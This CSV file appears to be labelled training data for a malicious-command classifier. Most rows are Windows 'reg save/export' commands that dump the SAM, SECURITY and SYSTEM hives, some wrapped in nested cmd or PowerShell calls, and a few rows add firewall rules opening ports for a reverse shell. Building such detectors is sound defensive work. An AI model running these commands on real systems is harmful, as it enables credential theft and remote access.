text,label
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\khuntng1.save""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\0qjbcjb4.dat""""",1
reg export hklm\security c:\windows\temp\lvz7pis9.save,1
"powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\y7fauprr.dat""",1
reg export hklm\security c:\windows\temp\rp6i7dkv.save,1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\7ngb0pmo.save""",1
reg export hklm\system c:\windows\temp\3m1z6n3t.save,1
reg export hklm\security c:\windows\temp\y9aphukf.save,1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\6yluvp3t.save""",1
reg save hklm\system c:\windows\temp\2ufyc2mf.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\psmyvbqy.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\07d2gxnm.dat""",1
reg export hklm\system c:\windows\temp\i755y6js.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\88s3wjuy.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\6miersiz.dat""",1
reg save hklm\system c:\windows\temp\zw9xhswj.save,1
reg export hklm\security c:\windows\temp\zr0cf2ch.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\d6tn8dg1.dat""",1
reg save hklm\security c:\windows\temp\rv6ojrji.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\qvmx3nq7.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\a0og09rh.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\6o36fjge.dat""",1
reg export hklm\sam c:\windows\temp\aamt3y5i.save,1
reg save hklm\sam c:\windows\temp\pv46zkyx.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\vnz0t7v4.dat""",1
reg save hklm\system c:\windows\temp\duofz4y8.save,1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\tm9zpnnh.dat""""",1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\wuzfs6gp.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\uxhb7j0x.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\hahby9yc.dat""",1
reg export hklm\sam c:\windows\temp\qqy446kp.save,1
reg export hklm\security c:\windows\temp\l0dnibp1.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\wb6cuoc5.dat""",1
reg save hklm\system c:\windows\temp\lzdzq2sb.save,1
reg save hklm\sam c:\windows\temp\x6inld26.save,1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\zw2gxjj8.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\iua0cicb.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\o6dtcz02.dat""",1
reg export hklm\sam c:\windows\temp\943mxdjb.save,1
reg save hklm\security c:\windows\temp\i4y7fugu.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\5i6u8c37.dat""",1
reg export hklm\security c:\windows\temp\pa8vo3lw.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\1plc0r3i.dat""",1
reg export hklm\system c:\windows\temp\5me5lub2.save,1
reg export hklm\system c:\windows\temp\uzyhzw8c.save,1
reg export hklm\security c:\windows\temp\jl5gt9g4.save,1
reg save hklm\security c:\windows\temp\hwmzcevq.save,1
reg save hklm\security c:\windows\temp\8v4psiyb.save,1
reg export hklm\security c:\windows\temp\68ztjqnl.save,1
reg export hklm\sam c:\windows\temp\4tlglrl2.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\n6e4awj8.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\33nuz0ji.dat""",1
reg save hklm\security c:\windows\temp\3zchwxo9.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\sbpmrjyb.save""",1
reg export hklm\security c:\windows\temp\fa8d66h3.save,1
reg save hklm\sam c:\windows\temp\zpamhbe6.save,1
reg save hklm\sam c:\windows\temp\x2vgwf06.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\51peubsx.dat""",1
reg export hklm\system c:\windows\temp\2hfkq44n.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\k3jfpg5t.dat""",1
reg export hklm\system c:\windows\temp\6oqrg5hv.save,1
reg save hklm\system c:\windows\temp\zg1a0idl.save,1
reg save hklm\security c:\windows\temp\hniqvwof.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\lfaa0b3t.dat""",1
reg save hklm\sam c:\windows\temp\tuylc12p.save,1
reg export hklm\system c:\windows\temp\jzgo02k2.save,1
reg save hklm\system c:\windows\temp\8lv73ed4.save,1
"[dllimport(""advapi32.dll"")]  extern  bool  openprocesstoken(...)",3
reg save hklm\sam c:\windows\temp\lkv0yrx7.save,1
reg save hklm\system c:\windows\temp\at1ict5f.save,1
reg save hklm\system c:\windows\temp\00uxhtae.save,1
reg export hklm\system c:\windows\temp\ah4w7kjq.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\p4fipumq.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\43d1iui0.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\z79nmctx.dat""",1
reg export hklm\security c:\windows\temp\935aycbr.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\5o0f5jig.dat""",1
reg export hklm\sam c:\windows\temp\mkfyqa9j.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\990vyjvo.dat""",1
reg export hklm\sam c:\windows\temp\0c19w486.save,1
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\0t8a3wbg.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\53a9ntx7.dat""",1
$a = [ref].assembly.gettype('system.management.automation.openprocesstoken'),3
"cmd.exe /c ""cmd.exe /c ""reg save hklm\security c:\temp\smjn7tn4.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\un1g9xfz.dat""",1
reg export hklm\security c:\windows\temp\9l5pubqh.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\nt0mu9an.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ro9t89o4.dat""",1
reg save hklm\security c:\windows\temp\ii16gdfr.save,1
reg save hklm\system c:\windows\temp\qr5rjl8x.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\ri00lcqu.dat""""",1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\security c:\temp\5us2cmgw.dat""""",1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\anso675e.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\1x7lvjsk.dat""",1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\3ehda4iv.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\dq2wgqf6.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\3ruf9pb6.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\3xb7cl52.dat""",1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\eecnfv4u.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\z9mz155z.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\w811u0y7.dat""",1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\ssjdeiqa.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\sed62xmg.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\zq6mvxzj.dat""",1
reg save hklm\system c:\windows\temp\x4f0i1ht.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\t57qq9z7.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\rudj0zxr.dat""",1
reg save hklm\system c:\windows\temp\91wuks1g.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\ujvk5q4k.dat""",1
reg save hklm\security c:\windows\temp\86en6l84.save,1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\d564btje.dat""""",1
reg save hklm\security c:\windows\temp\9c6ko0b9.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\fqrnrv6e.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\aflwh84f.dat""",1
reg save hklm\security c:\windows\temp\16njp8c6.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\8eodnx1v.dat""",1
reg save hklm\sam c:\windows\temp\kczes9df.save,1
reg save hklm\system c:\windows\temp\emt5zrhf.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\q2ffxq5n.dat""""",1
reg export hklm\security c:\windows\temp\crgglc69.save,1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\xrodzabx.dat""""",1
reg save hklm\security c:\windows\temp\bkoh8quy.save,1
reg  export  hklm\security  c:\windows\temp\fnxkh20a.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\ptqy2hbp.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\wm4reglr.dat""",1
reg export hklm\sam c:\windows\temp\i8uesi90.save,1
reg save hklm\security c:\windows\temp\tw03hyxw.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\1zmco9kh.dat""",1
reg export hklm\system c:\windows\temp\pihqobmh.save,1
reg   save   hklm\sam   c:\windows\temp\akvauol6.save,1
reg save hklm\system c:\windows\temp\e3kq6lzc.save,1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\lnbp5ybz.dat""""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\s6gws4tx.dat""",1
reg save hklm\system c:\windows\temp\25fe7tfi.save,1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\security c:\temp\dm6vnjss.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\d798z6s1.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\sm8ivqdx.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\cg3jyn1i.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\o9i0vsww.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\co9v7g26.dat""",1
reg save hklm\sam c:\windows\temp\8go3y1be.save,1
reg save hklm\system c:\windows\temp\kzqg0mf5.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\9tgao679.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\2yv3zxw8.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\o2fdh9gq.dat""",1
reg   save   hklm\security   c:\windows\temp\dp5ljwn3.save,1
reg export hklm\security c:\windows\temp\zhx4w3pt.save,1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\wvupqgz3.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\yl6rf26p.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\ge2t6ptr.dat""""",1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\v8hsg63u.dat""""",1
reg export hklm\sam c:\windows\temp\rcu7z072.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\a7g0ezgw.dat""",1
reg export hklm\security c:\windows\temp\nz2w95xp.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\82ij337h.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\zewvvc6o.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\sex1axak.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\6uzm7kcl.dat""",1
reg save hklm\security c:\windows\temp\olfocdna.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\72vx6nc8.dat""",1
reg export hklm\sam c:\windows\temp\g20hexuk.save,1
reg  save  hklm\security  c:\windows\temp\h473euce.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\a2jjaj3a.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\9nxzcpa4.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\bi5xnxr3.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\wiset19y.dat""",1
reg save hklm\security c:\windows\temp\m18r6p6e.save,1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\security c:\temp\bgn6wg91.dat""""",1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\hfwx6vj0.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\xbxp4g4s.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\security c:\temp\s3gmcimf.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\hfz8tw8b.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\knhoebkp.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\3sc6ifhm.dat""",1
reg export hklm\security c:\windows\temp\7fn1xm0b.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\cw0ndr0g.dat""",1
reg save hklm\security c:\windows\temp\hbtkrpw2.save,1
reg save hklm\security c:\windows\temp\rg4by7n6.save,1
reg save hklm\system c:\windows\temp\iniouz0j.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\3u2ztyhm.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\1qvzcpeh.dat""",1
reg export hklm\sam c:\windows\temp\wkfksmpy.save,1
reg export hklm\security c:\windows\temp\p13yluio.save,1
reg export hklm\system c:\windows\temp\qqgkt6k2.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\j599l59j.dat""",1
"powershell -nop -c ""netsh  advfirewall  firewall  add  rule  name=""bad""  action=allow  protocol=any  port=4444""",2
reg save hklm\security c:\windows\temp\zpcx7weu.save,1
reg export hklm\security c:\windows\temp\48zmjsot.save,1
reg save hklm\system c:\windows\temp\yvg0qfiv.save,1
reg save hklm\security c:\windows\temp\8lriolpr.save,1
reg save hklm\sam c:\windows\temp\nl9uttcx.save,1
reg save hklm\sam c:\windows\temp\f780aimh.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\3ype8nd8.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\228ippan.dat""",1
reg export hklm\system c:\windows\temp\t6v5m10f.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\d70zrby0.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\td0tf9hg.dat""",1
reg save hklm\sam c:\windows\temp\oksnmmy4.save,1
reg export hklm\security c:\windows\temp\bb1kpn64.save,1
reg export hklm\security c:\windows\temp\ncupucsm.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\63inmt0c.dat""",1
reg export hklm\security c:\windows\temp\32tjxfg6.save,1
reg save hklm\system c:\windows\temp\k25vcec7.save,1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\lwfw0oin.save""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\mhu95rfi.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\98fjfwny.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\q7sf41x4.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\fix8ic2m.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\gqd6cp31.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\kolc7u86.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\security c:\temp\qkmvnehf.dat""""",1
reg export hklm\system c:\windows\temp\h7bs82cs.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ic1cjeex.dat""",1
reg export hklm\security c:\windows\temp\kd0x53jl.save,1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\2qc44ysv.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\a9wsckar.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\kj5e5ptf.dat""",1
reg export hklm\security c:\windows\temp\vmb5fxwf.save,1
reg export hklm\security c:\windows\temp\495ump14.save,1
reg save hklm\security c:\windows\temp\m0eb9sko.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\gfq8osfs.dat""",1
reg save hklm\security c:\windows\temp\bdy80p7y.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\zmzcv1x1.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\sam c:\temp\pcitt5wu.dat""""",1
reg export hklm\system c:\windows\temp\td1k4ce2.save,1
reg save hklm\sam c:\windows\temp\czdi13rz.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\k2m9v0o5.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\k3dseu7u.dat""",1
reg export hklm\system c:\windows\temp\m22ot516.save,1
reg export hklm\sam c:\windows\temp\c376la4i.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\k4czse0d.dat""",1
reg save hklm\security c:\windows\temp\vqjvkww5.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\at9x1g3w.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\e34xtp2k.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\utjcslzd.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\0fqv74kb.dat""",1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\urwcw35k.save""",1
reg export hklm\system c:\windows\temp\fdvrgxya.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\covz6mgv.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\rlxsgrvz.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\w895vvo6.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\wudxo11f.dat""",1
reg save hklm\sam c:\windows\temp\lnuhx4s3.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\db3y56r8.dat""",1
reg save hklm\sam c:\windows\temp\ci8akrn7.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\ly7xrnoj.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\8mqwkahg.dat""",1
reg export hklm\security c:\windows\temp\zmo7vs9k.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\22ipc3sp.dat""""",1
reg export hklm\system c:\windows\temp\umuiykra.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ywn07ewo.dat""",1
reg export hklm\system c:\windows\temp\0jb9bj39.save,1
reg save hklm\system c:\windows\temp\nf1w88te.save,1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\uriaijw7.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\llt8jz3y.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\065h1706.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\1o3y9fkx.dat""",1
reg export hklm\system c:\windows\temp\638b74ol.save,1
reg save hklm\system c:\windows\temp\x07z5ncd.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\d24wzhbr.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\3ibva9tp.dat""""",1
reg export hklm\security c:\windows\temp\9wfck9tq.save,1
reg save hklm\system c:\windows\temp\osr9vq28.save,1
reg save hklm\sam c:\windows\temp\uyr1c8b4.save,1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\security c:\temp\f0l05lb0.dat""""",1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\grm8l0ix.save""",1
reg export hklm\sam c:\windows\temp\6azcxvzg.save,1
reg export hklm\security c:\windows\temp\lsf1ju9g.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\cg6jkufq.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\fl2y2aj4.dat""",1
reg export hklm\security c:\windows\temp\en8wu65k.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\nwssnidq.dat""",1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\7ezd42w1.save""",1
reg export hklm\system c:\windows\temp\wioeogjs.save,1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\2m6cgl3z.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\rj17vmsz.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\zigj2ydg.dat""",1
reg export hklm\system c:\windows\temp\u87dzp5m.save,1
reg save hklm\sam c:\windows\temp\wcf7ifml.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\b0r95lfb.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\8akorlto.dat""",1
reg   save   hklm\system   c:\windows\temp\dvp00bn0.save,1
reg save hklm\system c:\windows\temp\sciwf3hl.save,1
reg save hklm\system c:\windows\temp\w8upvmy2.save,1
reg save hklm\security c:\windows\temp\lmax9v5f.save,1
rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
"powershell -nop -c ""reg export hklm\sam c:\temp\digrj8pj.dat""",1
reg export hklm\sam c:\windows\temp\9yl1sw6g.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\tcs7h58a.dat""",1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\0q2t7620.save""",1
reg export hklm\system c:\windows\temp\tm2zxk3p.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\x171k6z6.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\r2j1zkjk.dat""",1
reg save hklm\system c:\windows\temp\ikarhxhl.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\qei31b9r.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\qgf4lg3g.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\gvgq6d1e.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\sam c:\temp\pyrzb45f.dat""""",1
reg save hklm\system c:\windows\temp\lcgyseom.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\xkpellac.dat""",1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\n60ny073.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\rrpjxrr7.dat""",1
reg save hklm\system c:\windows\temp\zjpamfew.save,1
reg export hklm\system c:\windows\temp\y99p441e.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\a0fmh7f6.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\l6zwdisj.dat""",1
reg export hklm\system c:\windows\temp\t9ftc42s.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\fj3mfnjs.dat""",1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\r12qlt9s.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\tz3va668.dat""",1
reg save hklm\sam c:\windows\temp\hdckb1jl.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\s6qmmlvr.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\l0pd3lu2.dat""",1
reg save hklm\system c:\windows\temp\2rerj4k9.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\6exdffpd.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\axfnee7q.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\mocbpvtt.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\ncf4u1hv.dat""",1
reg save hklm\sam c:\windows\temp\emlkn48v.save,1
reg export hklm\system c:\windows\temp\kcrp2f9q.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\po0io01b.dat""""",1
reg save hklm\system c:\windows\temp\cvamiyrp.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\dd5dovl5.dat""",1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\s2l0te2a.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\idp5isew.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\msxz5e8k.dat""",1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\8k43sdj2.save""",1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\usuysre7.save""",1
reg save hklm\system c:\windows\temp\qkgos1ej.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\6uzedxqs.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\sqm7vs5x.dat""",1
reg export hklm\sam c:\windows\temp\ribcrv1c.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\kim7ht4c.dat""",1
reg save hklm\system c:\windows\temp\fltnq7c7.save,1
reg export hklm\security c:\windows\temp\hnud9dsd.save,1
reg save hklm\system c:\windows\temp\88orb40k.save,1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\abpdztta.save""",1
reg save hklm\sam c:\windows\temp\95hq0x43.save,1
reg save hklm\system c:\windows\temp\f4xm7vvy.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\k5gaxpx5.dat""",1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\3grvx3up.dat""",1
reg save hklm\system c:\windows\temp\0rzgcac9.save,1
reg export hklm\system c:\windows\temp\bcxsmyus.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\zyt7kdb4.dat""",1
reg save hklm\system c:\windows\temp\2o0pug5p.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\x58o8mz4.dat""",1
reg save hklm\security c:\windows\temp\jx708n05.save,1
reg export hklm\system c:\windows\temp\518rd068.save,1
reg save hklm\system c:\windows\temp\35qtag4b.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\17q5ddli.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\n7vmhh1c.dat""",1
reg save hklm\sam c:\windows\temp\611gnh7j.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\057kiq31.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\q32ug70l.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\3k9w6f4l.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\g0i5r2sc.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\sam c:\temp\tma74uxu.dat""""",1
reg export hklm\system c:\windows\temp\ccliazi1.save,1
reg save hklm\sam c:\windows\temp\p5kmnoxu.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\yb73yxun.dat""",1
reg export hklm\sam c:\windows\temp\7zl45jb8.save,1
reg export hklm\system c:\windows\temp\cahjjea9.save,1
reg export hklm\security c:\windows\temp\bh96fqc8.save,1
reg export hklm\sam c:\windows\temp\i2ilgj52.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\9ydqti9k.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\t9odxr2f.dat""",1
"powershell -nop -c ""wmic   product   get   name,   version""",0
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\6a3hfvyj.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\l573pjdy.dat""",1
reg export hklm\sam c:\windows\temp\tayur5bj.save,1
reg save hklm\sam c:\windows\temp\n9us89wr.save,1
reg save hklm\sam c:\windows\temp\z5hidtkk.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\bd78oi43.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\1hk20gum.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\wgs4iy4j.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\y6f2k0j5.dat""""",1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\y8znnutw.dat""",1
reg save hklm\sam c:\windows\temp\kgsq73lk.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\av1capbd.dat""",1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\5sqgpc8l.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\9st25je4.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\59a9t1e0.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\or8hb7l3.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\al7v9gzq.dat""",1
